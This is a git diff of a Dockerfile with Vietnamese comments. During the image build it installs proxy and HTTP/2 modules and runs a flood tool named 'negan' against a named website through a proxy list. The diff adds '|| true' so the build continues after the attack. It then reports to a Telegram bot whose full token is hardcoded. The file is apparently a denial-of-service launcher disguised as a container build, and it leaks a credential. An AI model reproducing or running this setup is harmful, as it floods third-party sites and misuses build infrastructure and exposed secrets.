@@ -4,6 +4,8 @@ FROM node:alpine
 # Tạo thư mục làm việc
 WORKDIR /negan
 
+RUN apk add --no-cache curl
+
 # Cài đặt các module cần thiết bằng npm, chỉ cài đặt dependencies chính
 RUN npm install --omit=dev --omit=optional hpack https commander colors socks
 
@@ -11,7 +13,7 @@ RUN npm install --omit=dev --omit=optional hpack https commander colors socks
 COPY . .
 
 # Chạy lệnh node với tham số truyền vào
-RUN node ./negan -m GET -u https://muahack.com -p 1.txt --full true -s 10
+RUN node ./negan -m GET -u https://muahack.com -p 1.txt --full true -s 10 || true
 
 # Gửi tin nhắn thông báo về Telegram bot
 RUN curl -s -X POST https://api.telegram.org/bot7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw/sendMessage \
